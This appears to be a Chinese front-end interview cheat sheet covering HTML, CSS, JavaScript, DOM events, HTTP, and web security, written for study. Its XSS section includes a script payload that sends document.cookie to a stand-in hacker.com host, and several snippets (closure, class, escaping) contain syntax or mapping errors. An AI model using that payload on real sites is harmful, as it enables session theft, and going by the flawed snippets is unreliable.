# HTML #

1. （必考） 你是如何理解 HTML 语义化的？

	第一种举例，段落用 p，边栏用 aside，主要内容用 main 标签
		
	第二种：最开始是 PHP 后端写 HTML，不会 CSS，于是就用 table 来布局。table 使用展示表格的。严重违反了 HTML 语义化。后来有了专门的写 CSS 的前端，他们会使用 DIV + CSS 布局，主要是用 float 和绝对定位布局。稍微符合了 HTML 语义化。再后来，前端专业化，知道 HTML 的各个标签的用法，于是会使用恰当的标签来展示内容，而不是傻傻的全用 div，会尽量使用 h1、ul、p、main、header 等标签语义化的好处是已读、有利于SEO等 

	[HTML语义化](https://zhuanlan.zhihu.com/p/32570423)

2. meta viewport 是做什么用的，怎么写？(背)

    `<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">`
	
	控制页面在移动端不要缩小显示。

3. canvas 元素是干什么的(主要看API)

	[MDN 的 canvas 入门手册](https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API)

# CSS #

1. （必考） 说说盒模型（距离）

	content-box: width == 内容区宽度
	
	border-box: width == border 宽度 + 内容区宽度 + padding 宽度
	高度以此类推

2. css reset 和 normalize.css 有什么区别

	reset 重置，之前的样式我不要，a{color: red;}，抛弃默认样式
	
	normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一

3. （必考）如何居中

	- 水平居中
	
		内联：爸爸身上写 text-align:center;
	
		块级：margin-left: auto; margin-right: auto;

	- 垂直居中（7种）

		[demo](https://jscode.me/t/topic/1936)	

		![](https://i.imgur.com/KEOooC5.png)	

4. 选择器优先级如何确定

	a.选择器越具体，优先级越高。 #xxx 大于 .yyy

	b.同样优先级，写在后面的覆盖前面的。

	c.color: red !important; 优先级最高

5. BFC 是什么

	overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动）

	overflow:hidden 取消父子 margin 合并（方方用 padding-top: 1px,父元素）

6. 如何清除浮动

overflow: hidden （方方反对）
	
.clearfix 清除浮动写在爸爸身上

	 .clearfix::after{
	     content: ''; display: block; clear:both;
	 }
	 .clearfix{
	     zoom: 1; /* IE 兼容 */
	 }

# JS #

1. JS 有哪些数据类型

	string number bool undefined null object symbol

	object 包括了数组、函数、正则、日期等对象,一旦出现（数组、函数、正则、日期、NaN）直接0分

2. （必考） Promise 怎么使用

then

 	$.ajax(...).then(成功函数, 失败函数)

链式 then

	$.ajax(...).then(成功函数, 失败函数).then(成功函数2, 失败函数2)

如何自己生成 Promise 对象

	  function xxx(){
	      return new Promise(function(resolve, reject){
	          setTimeout(()=>{
	              resolve() 或者 reject()
	          },3000)
	      })
	  }
	  xxx().then(...)

3.（必考） AJAX 手写一下

	let xhr = new XMLHttpRequest()
	 xhr.open('POST', '/xxxx')
	 xhr.onreadystatechange = function(){
	     if(xhr.readyState === 4 && xhr.status === 200){
	         console.log(xhr.responseText)
	     }
	 }
	 xhr.send('a=1&b=2')

4.（必考）闭包是什么

	 function (){
	     var n = 0
	     return function(){
	         n += 1
	     }
	 }
	
	 let  adder = ()
	 adder() // n === 1
	 adder() // n === 2
	 console.log(n) // n is not defined

[闭包](https://zhuanlan.zhihu.com/p/22486908)

5.（必考）这段代码里的 this 是什么

	fn() 里面的 this 就是 window
	fn() 是 strict mode，this 就是 undefined
	a.b.c.fn() 里面的 this 就是 a.b.c
	new F() 里面的 this 就是新生成的实例
	() => console.log(this) 里面 this 跟外面的 this 的值一模一样
	正确参考：https://zhuanlan.zhihu.com/p/23804247

6.（必考）什么是立即执行函数？使用立即执行函数的目的是什么

	;(function (){
	     var name
	 }())
	 ;(function (){
	     var name
	 })()
	 !!!!!!!function (){
	     var name
	 }()
	 ~function (){
	     var name
	 }()
造出一个函数作用域，防止污染全局变量

ES 6 新语法

	 {
	     let  name
	 }

7.async/await 语法了解吗？目的是什么(参考MDN)

	function returnPromise(){
	     return new Promise( function(resolve, reject){
	         setTimeout(()=>{
	             resolve('fuck')
	         },3000)
	     })
	 }
	
	 returnPromise().then((result)=>{
	     result === 'fuck'
	 })
	
	 var result = await returnPromise()  // 注意只有控制台支持顶级作用域的 await，JS 文件里的 await 只能写在 async 函数里
	 result === 'fuck'

把异步代码写成同步代码

8.如何实现深拷贝

JSON 来深拷贝

	 var a = {...}
	 var b = JSON.parse( JSON.stringify(a) )

缺点：JSON 不支持函数、引用、undefined、RegExp、Date……

递归拷贝

	 function clone(object){
	     var object2
	     if(! (object instanceof Object) ){
	         return object
	     }else if(object instanceof Array){
	         object2 = []
	     }else if(object instanceof Function){
	         object2 = eval(object.toString())
	     }else if(object instanceof Object){
	         object2 = {}
	     }
	     你也可以把 Array Function Object 都当做 Object 来看待，参考 https://juejin.im/post/587dab348d6d810058d87a0a
	     for(let key in object){
	         object2[key] = clone(object[key])
	     }
	     return object2
	 }

环
RegExp、Date、Set、Symbol、WeakMap

9.如何实现数组去重

计数排序的逻辑（只能正整数）

	 var a = [4,2,5,6,3,4,5]
	 var hashTab = {}
	 for(let i=0; i<a.length;i++){
	     if(a[i] in hashTab){
	         // 什么也不做
	     }else{
	         hashTab[ a[i] ] = true
	     }
	 }
	 //hashTab: {4: true, 2: true, 5: true, 6:true, 3: true}
	 console.log(Object.keys(hashTab)) // ['4','2','5','6','3']

Set 去重

 	Array.from(new Set(a))

WeakMap 任意类型去重

10.如何用正则实现 string.trim()
	
	function trim(string){
	     return string.replace(/^\s+|\s+$/g, '')
	 }
11.JS 原型是什么？

举例

	var a = [1,2,3]
	只有0、1、2、length 4 个key
	为什么可以 a.push(4) ，push 是哪来的？
	a.__proto__ === Array.prototype
	push 就是沿着 a.__proto__ 找到的，也就是 Array.prototype.push
	Array.prototype 还有很多方法，如 join、pop、slice、splice
	Array.prototype 就是 a 的原型（__proto__）
	参考：https://zhuanlan.zhihu.com/p/23090041

12.ES 6 中的 class 了解吗？

	把 MDN class 章节看完
	记住一个例子

13.JS 如何实现继承？

原型链

	  function Animal(){
	      this.body = '肉体'
	  }
	  Animal.prototype.move = function(){
	
	  }
	
	  function Human(name){
	      Animal.apply(this, arguments)
	      this.name = name
	  }
	  // Human.prototype.__proto__ = Animal.prototype // 非法
	
	  var f = function(){}
	  f.prototype = Animal.prototype
	  Human.prototype = new f()
	
	  Human.prototype.useTools = function(){}
	
	  var frank = new Human()

extends 关键字

	  class Animal{
	      constructor(){
	          this.body = '肉体'
	      },
	      move(){}
	  }
	  class Human extends Animal{
	      constructor(name){
	          super()
	          this.name = name
	      },
	      useTools(){}
	  }
	  var frank = new Human()

# DOM 押题 #

1.DOM 事件模型是什么？
	
	冒泡
	捕获
	如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，顺序是由监听顺序决定的。

2.移动端的触摸事件了解吗？

touchstart touchmove touchend touchcancel

模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。

3.事件委托是什么？有什么好处？

假设父元素有4个儿子，我不监听4个儿子，而是监听父元素，看触发事件的元素是哪个儿子，这就是事件委托。

可以监听还没有出生的儿子（动态生成的元素）。省监听器。

	function listen(element, eventType, selector, fn){
	 element.addEventListener(eventType, e=>{
	     if(e.target.matches(selector)){
	         fn.call(el, e, el)
	     }
	 })
	}// 有 bug 但是可以应付面试官的事件委托
	function listen(element, eventType, selector, fn) {
	 element.addEventListener(eventType, e => {
	     let el = e.target
	     while (!el.matches(selector)) {
	         if (element === el) {
	             el = null
	             break
	         }
	         el = el.parentNode
	     }
	     el && fn.call(el, e, el)
	 })
	 return element
	} // 工资 12k+ 的前端写的事件委托
	listen(ul, 'click', 'li', ()=>{})
	
	ul>li*5>span

# HTTP 押题 #

1.HTTP 状态码知道哪些？

2.301 和 302 的区别是什么？

	301 永久重定向，浏览器会记住
	302 临时重定向

3.HTTP 缓存怎么做？

	Cache-Control: max-age=300
	http://cdn.com/1.js?v=1 避开缓存
	Cache-Control 和 Etag 的区别是什么？

4.Cookie 是什么？Session 是什么？

	Cookie
	HTTP响应通过 Set-Cookie 设置 Cookie
	浏览器访问指定域名是必须带上 Cookie 作为 Request Header
	Cookie 一般用来记录用户信息
	Session
	Session 是服务器端的内存（数据）
	Session 一般通过在 Cookie 里记录 SessionID 实现
	SessionID 一般是随机数
	LocalStorage 和 Cookie 的区别是什么？
	Cookie 会随请求被发到服务器上，而 LocalStorage 不会
	Cookie 大小一般4k以下，LocalStorage 一般5Mb 左右

5.（必考）GET 和 POST 的区别是什么？

	参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。

	安全（扯淡）。GET 没有 POST 安全（都不安全）

	GET 的参数（url查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）

	包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）

	GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）

6.（必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？
	
	JSONP
	CORS
	postMessage 看一下 MDN

# Vue 押题 #

[押题](https://xiedaimala.com/tasks/70dc33b3-ae2a-4b8a-98b1-66cce6df5193/text_tutorials/2c87ba2b-0719-44c6-8719-ed8ece30c1bb)

![](https://i.imgur.com/Jhd7XXe.png)

# Webpack  #

转译出的文件过大怎么办？
	
	使用 code split
	写法 import('xxx').then(xxx=>{console.log(xxx)})
	xxx 模块就是按需加载的

转译速度慢什么办？

# 安全 #

什么是 XSS 攻击？如何预防？

举例
	  div.innerHTML = userComment  // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script>
	  // 恶意就被执行了，这就是 XSS

预防

不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行

如果你一样要用 innerHTML，字符过滤

	把 < 替换成 &lt;
	把 > 替换成 &gt;
	把 & 替换成 &amp;
	把 ' 替换成 &#39;
	把 ' 替换成 &quot;

代码 div.innerHTML = userComment.replace(/>/g, '&lt;').replace...

使用 CSP Content Security Policy

2.什么是 CSRF 攻击？如何预防？

过程
	
	用户在 qq.com 登录
	用户切换到 hacker.com（恶意网站）
	hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。
	用户在不知不觉中添加 hacker 为好友。
	用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。

避免

	检查 referer，qq.com 可以拒绝来自 hacker.com 的请求
	csrf_token 来解决

# 从输入 URL 到页面展现中间发生了什么 #
	
	1 DNS 查询 DNS 缓存
	2 建立 TCP 连接（三次握手）连接复用
	3 发送 HTTP 请求（请求的四部分）
	4 后台处理请求
		监听 80 端口
		路由
		渲染 HTML 模板
		生成响应
	5 发送 HTTP 响应
	6 关闭 TCP 连接（四次挥手）
	7 解析 HTML
	8 下载 CSS（缓存
	解析 CSS
	9 下载 JS（缓存
	解析 JS
	10 下载图片
	解析图片
	11 渲染 DOM 树
	12 渲染样式树
	13 执行 JS